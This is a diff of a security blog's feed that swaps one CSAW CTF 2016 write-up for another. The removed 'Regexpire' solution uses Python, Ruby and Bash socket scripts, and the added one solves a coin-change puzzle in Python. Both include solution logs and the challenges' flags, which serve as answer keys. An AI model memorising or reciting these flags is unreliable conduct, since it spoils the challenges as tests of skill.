-    <summary type="html">
-    
-      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
-    
-    </summary>
-    
-      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
-    
-      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
-    
-    
-      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
-    
-      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
-    
-      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
-    
-      <category term="reconnaissance" scheme="http://rawsec.ml/tags/reconnaissance/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CSAW CTF - 100 - Rgexepire - Misc</title>
-    <link href="http://rawsec.ml/en/CSAW-2016-100-Regexpire-misc/"/>
-    <id>http://rawsec.ml/en/CSAW-2016-100-Regexpire-misc/</id>
-    <published>2016-09-17T22:00:00.000Z</published>
-    <updated>2016-10-12T21:07:54.498Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
-<thead>
-<tr>
-<th>By</th>
-<th>Version</th>
-<th>Comment</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>noraj</td>
-<td>1.0</td>
-<td>Creation</td>
-</tr>
-</tbody>
-</table>
-<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
-<li><strong>Name</strong> : CSAW CTF Qualification Round 2016</li>
-<li><strong>Website</strong> : <a href="https://ctf.csaw.io/" target="_blank" rel="external">https://ctf.csaw.io/</a></li>
-<li><strong>Type</strong> : Online</li>
-<li><strong>Format</strong> : Jeopardy</li>
-<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/347" target="_blank" rel="external">link</a></li>
-</ul>
-<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>I thought I found a perfect match but she ended up being my regEx girlfriend.</p>
-<p><code>nc misc.chal.csaw.io 8001</code></p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>It was very similar with <a href="https://backdoor.sdslabs.co/challenges/ISOLVE" target="_blank" rel="external">ISolve from BackdoorCTF 2016</a>.</p>
-<p>I made 3 scripts to solve this:</p>
-<ul>
-<li>In Python with <a href="https://pypi.python.org/pypi/rstr/2.2.4" target="_blank" rel="external">rstr.xeger</a> (inspired by <a href="https://github.com/p4-team/ctf/tree/master/2016-06-04-backdoor-ctf/ppc_isolve" target="_blank" rel="external">p4</a>)</li>
-<li>In Ruby with <a href="https://rubygems.org/gems/regexp-examples/versions/1.2.0" target="_blank" rel="external">regexp-examples</a></li>
-<li>In Bash with <a href="https://github.com/asciimoo/exrex" target="_blank" rel="external">exrex</a> (simplified version)</li>
-</ul>
-<p>I flaged with the Python one, the Ruby one work well too and the Bash one work badly due to the dirty way exrex handle regex. Here a proof of success (after the end of the CTF) :</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">to solve = &apos;(wolf|gazelle)*[V8xqjx0A8]+[AoqoYnDiu]i3b+[ukqUrDlf]xf+(tomato|elephant)*(clinton|tomato)&apos;</div><div class="line">solution  = wolfgazellegazellegazellewolfwolfgazelle88xj8Ajx0xAjqx8xxAx8088AqVV0jV8Axjxx8qjV8x8qV0x8V0ii3bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbqxffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffftomatotomatoelephantelephanttomatoelephanttomatotomatoelephanttomatoelephanttomatoelephantelephantelephanttomatotomatotomatotomatoelephantelephanttomatotomatoelephantelephanttomatotomatoelephanttomatoelephantelephanttomatoelephanttomatotomato</div><div class="line">D*[i-r]*(dolphin|sloth)(clinton|giraffe)[nNAUqCu]z4*\d+DM*v&#123;9&#125;[e-j](fish|cat)(penguin|sloth)+(chair|clinton)&#123;7&#125;</div><div class="line">to solve = &apos;D*[i-r]*(dolphin|sloth)(clinton|giraffe)[nNAUqCu]z4*1+DM*v&#123;9&#125;[e-j](fish|cat)(penguin|sloth)+(chair|clinton)&#123;7&#125;&apos;</div><div class="line">solution  = DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDmkpkoijmnrniprlknjppmmrjnlqqpjilrnqjmimkkmrndolphinclintonqz444444444444444444444444444444444444444444111111111111111111111111111111111111111111111111111111111111111111111111DMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMvvvvvvvvvhfishpenguinslothpenguinslothpenguinpenguinpenguinslothpenguinslothpenguinpenguinpenguinslothpenguinpenguinpenguinslothslothslothslothpenguinslothpenguinslothpenguinslothpenguinslothpenguinpenguinslothslothpenguinpenguinslothpenguinslothpenguinpenguinslothpenguinpenguinslothslothpenguinslothpenguinchairchairchairclintonchairclintonchair</div><div class="line">flag&#123;^regularly_express_yourself$&#125;</div><div class="line">to solve = &apos;flag&#123;^regularly_express_yourself$&#125;&apos;</div><div class="line">solution  = flag&#123;regularly_express_yourself&#125;</div></pre></td></tr></table></figure>
-<p>Python:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> rstr</div><div class="line"><span class="keyword">import</span> socket</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrapper_reg</span><span class="params">(s)</span>:</span></div><div class="line">  s = re.sub(<span class="string">'[\\\]&#123;1&#125;[W]&#123;1&#125;'</span>, <span class="string">' '</span>, s)</div><div class="line">  s = re.sub(<span class="string">'[\\\]&#123;1&#125;[W]&#123;1&#125;'</span>, <span class="string">'a'</span>, s)</div><div class="line">  s = re.sub(<span class="string">'[\\\]&#123;1&#125;[d]&#123;1&#125;'</span>, <span class="string">'1'</span>, s)</div><div class="line">  s = re.sub(<span class="string">'[\\\]&#123;1&#125;[D]&#123;1&#125;'</span>, <span class="string">'#'</span>, s)</div><div class="line">  <span class="keyword">return</span> s</div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line">def wrapper(s):</div><div class="line">  s = re.sub('\s+', '\t', s)</div><div class="line">  s = re.sub('[^0-9a-zA-Z\s]+', '#', s)</div><div class="line">  return s</div><div class="line">"""</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvuntil</span><span class="params">(s)</span>:</span></div><div class="line">    data = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9999</span>):</div><div class="line">        c = s.recv(<span class="number">1</span>)</div><div class="line">        <span class="keyword">if</span>(c == <span class="string">'\n'</span>):</div><div class="line">            <span class="keyword">break</span></div><div class="line">        data += c</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    url = <span class="string">"misc.chal.csaw.io"</span></div><div class="line">    port = <span class="number">8001</span></div><div class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    s.connect((url, port))</div><div class="line">    i = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</div><div class="line">            task = recvuntil(s)</div><div class="line">            print(task)</div><div class="line">            i = <span class="number">1</span></div><div class="line">        task = recvuntil(s)</div><div class="line">        print(task)</div><div class="line">        to_solve = task</div><div class="line">        <span class="keyword">if</span> len(to_solve) == <span class="number">0</span>:</div><div class="line">            print(task)</div><div class="line">        <span class="keyword">elif</span>(to_solve == <span class="string">'Irregular'</span> <span class="keyword">or</span> to_solve == <span class="string">'Timeout'</span>):</div><div class="line">            <span class="keyword">break</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            to_solve = wrapper_reg(to_solve)</div><div class="line">            print(<span class="string">"to solve = '%s'"</span> % to_solve)</div><div class="line">            solution = rstr.xeger(to_solve).replace(<span class="string">'\n'</span>,<span class="string">''</span>)</div><div class="line">            <span class="comment">#solution = wrapper(solution)</span></div><div class="line">            print(<span class="string">"solution  = %s"</span> % solution)</div><div class="line">            s.sendall(solution + <span class="string">"\n"</span>)</div><div class="line">        sleep(<span class="number">0.1</span>)</div><div class="line"></div><div class="line">main()</div></pre></td></tr></table></figure>
-<p>Ruby:</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">### Dependencies ###</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'regexp-examples'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'socket'</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">### Functions ###</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(s)</span></span></div><div class="line">  s = s.gsub(<span class="string">'\s+'</span>, <span class="string">'\t'</span>)</div><div class="line">  s = s.gsub(<span class="string">'[^0-9a-zA-Z\s]+'</span>, <span class="string">'#'</span>)</div><div class="line">  <span class="keyword">return</span> s</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment">### Main ###</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __FILE_<span class="number">_</span> == $0</div><div class="line">  hostname = <span class="string">'misc.chal.csaw.io'</span></div><div class="line">  port = <span class="number">8001</span></div><div class="line"></div><div class="line">  s = TCPSocket.open(hostname, port)</div><div class="line">  output = <span class="string">""</span></div><div class="line">  exit_test = <span class="literal">nil</span></div><div class="line"></div><div class="line">  <span class="comment"># pass Can you match these regexes?</span></div><div class="line">  line = s.gets</div><div class="line">  puts line.chop</div><div class="line"></div><div class="line">  <span class="keyword">while</span> <span class="keyword">not</span> exit_test</div><div class="line">    line = s.gets       <span class="comment"># Read lines from the socket</span></div><div class="line">    puts line.chop      <span class="comment"># And print with platform line terminator</span></div><div class="line">    output = output.concat(line)</div><div class="line"></div><div class="line">    <span class="comment"># stop = /Can you match these regexes?\s+(.*)/.match(output)</span></div><div class="line">    stop = <span class="literal">true</span></div><div class="line">    <span class="keyword">if</span> stop</div><div class="line">      reg_test = output.match(<span class="regexp">/(.*)/</span>)</div><div class="line">      reg = <span class="regexp">/<span class="subst">#&#123;reg_test[<span class="number">1</span>]&#125;</span>/</span></div><div class="line">      example = reg.random_example</div><div class="line">      example = wrapper(example)</div><div class="line">      <span class="keyword">if</span> example != <span class="literal">nil</span></div><div class="line">        puts <span class="string">"solution :"</span> + example</div><div class="line">      <span class="keyword">end</span></div><div class="line">      s.puts(example.gsub(<span class="string">'\n'</span>, <span class="string">''</span>))</div><div class="line">      s.flush</div><div class="line">      output = <span class="string">""</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">    exit_test = <span class="regexp">/Failed regex/</span>.match(output)</div><div class="line">    <span class="keyword">if</span> exit_test</div><div class="line">      exit(<span class="number">1</span>)</div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">end</span></div><div class="line">  s.close               <span class="comment"># Close the socket when done</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
-<p>Bash:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"></div><div class="line"><span class="comment">#######</span></div><div class="line"><span class="comment">#Config</span></div><div class="line"></div><div class="line">URL=<span class="string">"misc.chal.csaw.io"</span></div><div class="line">PORT=8001</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#####</span></div><div class="line"><span class="comment">#Main</span></div><div class="line"></div><div class="line">OUT=<span class="string">""</span></div><div class="line"></div><div class="line"><span class="comment"># Open socket</span></div><div class="line"><span class="built_in">exec</span> 3&lt;&gt;/dev/tcp/<span class="variable">$&#123;URL&#125;</span>/<span class="variable">$&#123;PORT&#125;</span></div><div class="line"></div><div class="line"><span class="built_in">read</span> LINE &lt;&amp;3</div><div class="line"><span class="built_in">echo</span> <span class="variable">$LINE</span> &gt;&amp;1</div><div class="line"><span class="keyword">while</span> [ -z <span class="string">"<span class="variable">$EXIT</span>"</span> ]</div><div class="line"><span class="keyword">do</span></div><div class="line"></div><div class="line">	<span class="built_in">read</span> LINE &lt;&amp;3</div><div class="line">	<span class="built_in">echo</span> <span class="variable">$LINE</span> &gt;&amp;1</div><div class="line">	exrex -r <span class="string">"<span class="variable">$LINE</span>"</span> &gt;&amp;3</div><div class="line">	OUT=<span class="string">""</span></div><div class="line"></div><div class="line">	EXIT=$( <span class="built_in">echo</span> <span class="string">"<span class="variable">$OUT</span>"</span> | awk <span class="string">'/Irregular/ &#123; getline; print $0 &#125;'</span> )</div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
-<p>My point of view: This kind of chanllenge is tricky due to bad implementation of regex server and/or regex solver so you always need to fix/wrap regex answers/solutions. I think it’s better to put a short timeout (&lt;1s) rather than a lot a steps (100+) to prevent humans to do it by hand because the more steps there are the more chances you have to get a bug. I think the goal of the challenge is to make user script, use regex and parsing, use socket but not to correct/complete other’s tools.</p>
+<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p><em>#Hope #Change #Obama2008</em></p>
+<p><code>nc misc.chal.csaw.io 8000</code></p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>The problem here is to split up a sum of money into its equivalent in bills and coins (minimum).</p>
+<p>Here we have to script again:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> socket</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</div><div class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</div><div class="line"></div><div class="line"></div><div class="line">total = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvuntil</span><span class="params">(s, pattern, tryouts)</span>:</span></div><div class="line">    data = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(tryouts):</div><div class="line">        <span class="comment"># sleep(1)</span></div><div class="line">        data += s.recv(<span class="number">9999</span>)</div><div class="line">        <span class="keyword">if</span> pattern <span class="keyword">in</span> data:</div><div class="line">            <span class="keyword">return</span> data</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(bills)</span>:</span></div><div class="line">    <span class="keyword">global</span> total</div><div class="line">    times = Decimal(str(total)) / Decimal(str(bills))</div><div class="line">    <span class="keyword">if</span> times &gt;= <span class="number">1</span>:</div><div class="line">        total = Decimal(str(total)) - Decimal(str(int(times))) * Decimal(str(bills))</div><div class="line">    <span class="keyword">return</span> int(times)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">global</span> total</div><div class="line">    url = <span class="string">"misc.chal.csaw.io"</span></div><div class="line">    port = <span class="number">8000</span></div><div class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    s.connect((url, port))</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        task = recvuntil(s, <span class="string">"$10,000 bills:"</span>, <span class="number">10</span>)</div><div class="line">        print(task)</div><div class="line">        total = re.findall(<span class="string">"\$(.*)\s+\$10,000 bills:"</span>, task)</div><div class="line">        <span class="keyword">if</span> len(total) == <span class="number">0</span>:</div><div class="line">            print(task)</div><div class="line">            sleep(<span class="number">10</span>)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="comment"># print(total[0])</span></div><div class="line">            total = Decimal(str(total[<span class="number">0</span>]))</div><div class="line"></div><div class="line">            <span class="comment"># $10,000 bills:</span></div><div class="line">            to_send = str(calc(<span class="number">10000</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $5,000 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$5,000 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">5000</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $1,000 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$1,000 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">1000</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $500 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$500 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">500</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $100 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$100 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">100</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $50 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$50 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">50</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $20 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$20 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">20</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $10 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$10 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">10</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $5 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$5 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">5</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># $1 bills:</span></div><div class="line">            task = recvuntil(s, <span class="string">"$1 bills:"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">1</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># half-dollars (50c):</span></div><div class="line">            task = recvuntil(s, <span class="string">"half-dollars (50c):"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">0.50</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># quarters (25c):</span></div><div class="line">            task = recvuntil(s, <span class="string">"quarters (25c):"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">0.25</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># dimes (10c):</span></div><div class="line">            task = recvuntil(s, <span class="string">"dimes (10c):"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">0.10</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># nickels (5c):</span></div><div class="line">            task = recvuntil(s, <span class="string">"nickels (5c):"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">0.05</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">            <span class="comment"># pennies (1c):</span></div><div class="line">            task = recvuntil(s, <span class="string">"pennies (1c):"</span>, <span class="number">10</span>)</div><div class="line">            print(task)</div><div class="line">            to_send = str(calc(<span class="number">0.01</span>))</div><div class="line">            s.sendall(to_send + <span class="string">"\n"</span>)</div><div class="line">            print(to_send)</div><div class="line"></div><div class="line">main()</div></pre></td></tr></table></figure>
+<p>Oh yeah this script is dirty and can be a lot more functional but you know in CTF all is a matter of time…</p>
+<p>Proof of flag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">$22479.22</div><div class="line">$10,000 bills:</div><div class="line">2</div><div class="line">$5,000 bills:</div><div class="line">0</div><div class="line">$1,000 bills:</div><div class="line">2</div><div class="line">$500 bills:</div><div class="line">0</div><div class="line">$100 bills:</div><div class="line">4</div><div class="line">$50 bills:</div><div class="line">1</div><div class="line">$20 bills:</div><div class="line">1</div><div class="line">$10 bills:</div><div class="line">0</div><div class="line">$5 bills:</div><div class="line">1</div><div class="line">$1 bills:</div><div class="line">4</div><div class="line">half-dollars (50c):</div><div class="line">0</div><div class="line">quarters (25c):</div><div class="line">0</div><div class="line">dimes (10c):</div><div class="line">2</div><div class="line">nickels (5c):</div><div class="line">0</div><div class="line">pennies (1c):</div><div class="line">2</div><div class="line">correct!</div><div class="line">flag&#123;started-from-the-bottom-now-my-whole-team-fucking-here&#125;</div></pre></td></tr></table></figure>
 ]]></content>
     
     <summary type="html">
